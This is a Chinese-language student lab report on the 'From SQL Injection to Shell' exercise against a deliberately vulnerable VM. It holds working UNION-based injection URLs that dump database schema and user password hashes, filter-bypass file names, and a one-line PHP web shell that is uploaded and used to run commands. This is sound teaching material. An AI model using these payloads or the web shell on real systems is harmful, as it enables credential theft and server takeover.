>    实验：From SQL Injection to Shell

- [ ] 实验环境搭建
    - victim：     from_sqli_to_shell_i386.iso(debian 32)
    - attacker： kali 
    
    
   网络拓扑图如下：

     ![tuopu](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/tuopu.jpg)
         
   安装工具 wfuzz步骤如下：

   - 下载[wfuzz](https://github.com/xmendez/wfuzz) 
   - 解压到共享文件夹，使用时进入解压目录，即可使用wfuzz。
      
  
- [ ] 攻击分为三步进行：

    1.Fingerprinting

    2.Detection and exploitation of SQL injection

    3.Access to the administration pages and code execution

以下是每一步的具体介绍：

------------------------

>  1.Fingerprinting

一、在进行实验之前，首先使用nmap 扫描一下 victim 对外开放的端口
`nmap 10.0.2.12`

扫描结果如下：

```Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-17 02:01 EST
Nmap scan report for bogon (10.0.2.12)
Host is up (0.000095s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7D:5D:57 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```
由上面的扫描结果可知， victim的 22/tcp  和 80/tcp 端口均是开放的。


二、 FingerPrinting ，顾名思义，可以用来收集`web application` 的信息。分为以下两步进行:

1. **inspecting HTTP headers**
      netcat/telnet  可以用于连接web app ，从而获取server的信息。
      以telnet 为例， 在 attacker 的终端输入：
 
       `telnet 10.0.2.10 80`
       `GET / HTTP/1.1`
       `Host: 10.0.2.12`
       
   victim 返回的文件信息如下：
 
        HTTP/1.1 200 OK
        Date: Sat, 17 Nov 2018 06:49:58 GMT
        Server: Apache/2.2.16 (Debian)
        X-Powered-By: PHP/5.3.3-7+squeeze14
        Vary: Accept-Encoding
        Content-Length: 1343
        Content-Type: text/html

 
     由上面的返回信息可以看到，我们可以获取server端 apache、php的`版本信息`。

   由上面的扫描结果可知，`443/tcp`端口并未开放，所以我们只能通过 HTTP的方式访问victim，如果victim只能通过HTTPS的方式进行访问，telent/natcat 就不能用于与 victim 通信，此时我们可以使用工具 `openssl` 访问victim(nc -nvlp 443 可以开启 443/https 服务)。


2.  **using a directory Buster**
 
    使用工具 wfuzz用于检测victim的目录和文件结构。
 wfuzz的基于一个简单的概念：它用一个给定的payload来替换相应的FUZZ关键词的值，我们称FUZZ这样的关键词为 `占位符` , 而payload则是一个`输入的源`。

    在 attacker 中使用 `wfuzz -w wordlist/general/big.txt --hc 404  http://10.0.2.12/FUZZ` 扫描victim，扫描结果如下：


      
```
Warning: Pycurl is not compiled against Openssl. Wfuzz might not                  work correctly when fuzzing SSL sites. Check Wfuzz's documentation    for more information.

********************************************************
* Wfuzz 2.3 - The Web Fuzzer                           *
********************************************************

Target: http://10.0.2.12/FUZZ
Total requests: 3036

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000138:  C=301      9 L	      28 W	    306 Ch	  "admin"
000547:  C=200     92 L	     141 W	   1858 Ch	  "cat"
000586:  C=403     10 L	      30 W	    285 Ch	  "cgi-bin/"
000642:  C=301      9 L	      28 W	    308 Ch	  "classes"
000761:  C=301      9 L	      28 W	    304 Ch	  "css"
001290:  C=200     40 L	      63 W	    796 Ch	  "header"
001362:  C=301      9 L	      28 W	    307 Ch	  "images"
001375:  C=200     71 L	     103 W	   1343 Ch	  "index"
002489:  C=200     70 L	     108 W	   1320 Ch	  "show"

Total time: 4.734385
Processed Requests: 3036
Filtered Requests: 3027
Requests/sec.: 641.2659
```



   在 attacker 中使用 `wfuzz -w wordlist/general/common.txt --hc 404 http://10.0.2.12/FUZZ.php` 扫描victim，扫描结果如下：

```
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.0.2.12/FUZZ.php
Total requests: 950

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000076:  C=200     96 L	     148 W	   2022 Ch	  "all"
000167:  C=200     92 L	     141 W	   1858 Ch	  "cat"
000406:  C=200     40 L	      63 W	    796 Ch	  "header"
000438:  C=200     71 L	     103 W	   1343 Ch	  "index"
000761:  C=200     70 L	     108 W	   1320 Ch	  "show"

Total time: 1.379570
Processed Requests: 950
Filtered Requests: 945
Requests/sec.: 688.6203

```
-------------------------------------------------


> 2.Detection and exploitation of SQL injection** 

检测和利用SQL进行注入，大体分为如下两步：

1.  **Detection of SQL injection**

    a. 基于`Intergers`的检测

        在attacker中访问如下网址 `10.0.2.12/cat.php?id =1`，显示如下：
         ![1](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/1.PNG)
    
         在attacker中访问如下网址 `10.0.2.12/cat.php?id =2`，显示如下：
         ![2](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/2.PNG)  
    
         在attacker中访问如下网址 `10.0.2.12/cat.php?id =2-1`，显示如下：
         ![3](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/3.PNG)
  
        在attacker中访问如下网址 `10.0.2.12/cat.php?id =2  and 1=1`，推测server端执行 `select id = 2 and 1=1 from .....` ,显示如下：
       ![4](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/4.PNG)

 
 由上面的访问结果可知，当 `id = 2-1` 时,访问结果的页面等同于 `id = 1`,可见减法被数据库自动执行。这样就找到了一个SQL注入。
  由上面实验表现可知，victim端数据库查询id时，使用interger而非string。SQL允许两种语法，但是使用interger查询比使用string更快。
  
  
 
  b.基于string的检测


  在SQL中使用 ' -- 可以注释SQL 查询的剩余部分。
  

----------------------------------------------------------

2. **Exploitation of SQL injections**

   a. `union`关键字
         SQL UNION 语句用于合并两个或多个SELECT语句的结果。
         UNION 内部的每个select语句必须拥有相同数量的列。列也必须拥有相似的数据类型，同时，每个select语句中的列的顺序必须相同。UNION 会对结果的每一列进行自动去重。
         
     最关键的地方在于，使用 `union` 连接的两条语句必须返回相同的列数，否则数据库会报错。

        
   b. 使用 `UNION` 完成SQL注入
  
   基本步骤如下：

         1.首先找到UNION语句内部的列数。
         2.判断每列在页面中回显的列
         3.从meta-table中检索信息
         4.从其他表或数据库中检索信息

    为了找到列数，有两种方法
   

         1.使用 UNION SELECT 并增加列数
         2.使用ORDER　BY语句
        
-----
   1.  如果使用 UNION SELECT语句，可以利用如下报错信息进行枚举：
    `   The used SELECT statements have a different number of columns `  `   The used SELECT statements have a different number of columns `
 
 使用victim进行测试，在网址中不断加入值 1,2，3... 进行枚举，当加入到第4列的时候，网页正常显示。如下图：
            ![5](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/5.PNG)
            
 而加入到第5列的时候出错，可推测出数据库中select语句一共有4列。
 
--------
**注意**：

使用数值 1,2,3.... 适用于mysql，但并一定适用于其他数据库。此时，如果要求UNION两边列的类型相同，数值 1,2,3... 应被替换成 null, null,null ... 。在Oracle中，使用select语句必须使用 from，此时可用 `dual`　可用于填充表格，即`UNION SELECT null,null... FROM dual`。

-------

2.  类似的，也可以使用 ORDER BY 语句进行枚举，使用		`SELECT firstname,lastname,age,groups FROM users ORDER BY  column value		` 时，数据库会按照对应的列进行排序输出结果，但是如果使用了不存在列，数据库会进行如下的报错： `Unknown column 'xxx' in 'order clause'`, 可以借用此报错信息推断出select语句对应的列数。

    使用victim进行测试，在ORDER BY 语句后依次进行测试，当测试到5时，出现报错信息，如下：
     ![6](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/6.PNG)


    由以上两种信息，都可猜测出victim的该select语句的列数为4.


    c. 检索信息

     基于以上的报错信息，可知victim的后端数据库使用的是MYSQL。已知select语句的列数为4，我们可以在UNION部分对数值进行替换，强制数据执行某些函数。
 如可以使用如下 URL获取信息：
 
     1.数据库版本  `http://vulnerable/cat.php?id=1 UNION SELECT 1, @@version,3,4`
           ![7](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/7.PNG)
           
 
2.当前用户     `http://vulnerable/cat.php?id=1 UNION SELECT 1, current_user(),3,4`
       ![8](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/8.PNG)
        
 
  3.当前使用的数据库   `http://vulnerable/cat.php?id=1 UNION SELECT 1, database(),3,4`
     ![9](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/9.PNG)
     
  
 现在我们可以检索任意我们想检索的信息，为了检索相关信息，我们需要：
```
     当前数据库中的所有表项
     我们想获取信息的表对应的列名
```

   MYSQL 从`版本5`开始提供关于数据库表和列的的元信息（meta-information)，这些表存储在数据库 `information_shema` 中，并且，在`information_schema.columns`中存储了每列对应的表格信息。可以使用以下的查询获取对应信息：
   
      1.所有表格的列表       `SELECT table_name FROM information_schema.tables`
      2.所有列的列表         `SELECT column_name FROM information_schema.columns`
      3. 所有列对应归属的表   `SELECT table_name,column_name FROM information_schema.columns`
  
 根据上面的查询，可以结合之前的URL利用UNION进行注入,使用victim测试以下语句：
 
   1.获取所有表格的列表  `http://vulnerable/cat.php?id=1 UNION SELECT 1,table_name ,3,4 FROM information_schema.tables`
         ![10](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/10.PNG)
         
  
2.获取所有列的列表   `http://vulnerable/cat.php?id=1 UNION SELECT 1,column_name ,3,4 FROM information_schema.columns`
        ![11](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/11.PNG)
        

3.按顺序获取所有列对应属于的表  `http://vulnerable/cat.php?id=1 UNION SELECT 1,table_name ,column_name,4 FROM information_schema.columns`
        ![12](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/12.PNG)
        
 
4.同时输出列和列对应的表名称：  `http://vulnerable/cat.php?id=1 UNION SELECT 1,concat(table_name ,':',column_name),3,4 FROM information_schema.columns`
      ![13](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/13.PNG)
      
   ----------------------
   **注意**：
   如果想使用正则匹配对结果进行提取，可以在输出信息中加入标记。
   
---------------------
        
现在我们获取了所有的表格及其包含的列，第一个表格是默认的MYSQL表格，在HTML的结尾的表格可能就是当前正在使用的表。


现在，我们可以随意查询我们想获取的信息。
例如，我们可以在使用如下语句，查询用户登录密码：
`http://vulnerable/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM  users`
使用victim 进行测试，测试结果如下：
             ![14](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/14.PNG)
       

> 3.Access to the administration pages and code execution**  
    
访问administer和运行代码大致分为2步：

    
1. **Cracking the password**
     使用以下两种方法可以轻易破解密码：
                
       1.搜索引擎
       2.John-The-Ripper http://www.openwall.com/john/


   如果密码的哈西值没有进行加盐，可以使用搜索引擎直接搜索。也可以使用john工具进行解密。
使用搜索引擎直接搜索获取到密码如下：`P4sswrd`
          
2. 	**Uploading a Webshell and Code Execution**					
        已经获取了用户名和密码，现在的任务就是找到方法在victim的操作系统中运行指令。 可以使用以下`webshell`代码 在 victim中获取参数 `cmd`并执行。
```
       <?php
       system($_GET['cmd']);
       ?>
```
假设将文件命名为 `shell.php` ,那么怎么上传这段代码呢？
使用已经获取的用户名密码登录网站，则可以看到网站支持上传新的图片，可以使用该功能将代码上传。
             ![15](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/15.PNG)
             
为了防止网站对 .php 结尾的文件的过滤，有两种方法：

       1.命名为 `shell.php3`
       2.命名为 `shell.php.test`  ，可以躲过对 .php 文件的过滤，同时由于 Apache并没有  `.test` 的文件，所以会运行   `.php` 的文件。

现在我们将重命名后的文件  `shell.php.test` 通过图片上传的方式传到服务器上，上传成功截图如下：
        ![16](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/16.PNG)
         
然后在浏览器中，访问 `http://10.0.2.12/admin/uploads/shell.php3?cmd=uname`    ，这样在受害者端会执行指令 `uname` ,返回结果如下：

   ![17](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/17.PNG)

还有许多指令也可以执行，事实上，webshell和 web server上运行的php脚本具有相同的权限。在victim的server端每一个命令的运行都是相互独立的。


**参考资料**：
拓展：burp suite 

1. [wfuzz manual ](https://media.readthedocs.org/pdf/wfuzz/latest/wfuzz.pdf)

2. [blog of this experiment](https://maliyaablog.wordpress.com/2016/07/23/blog-post-title-2/)




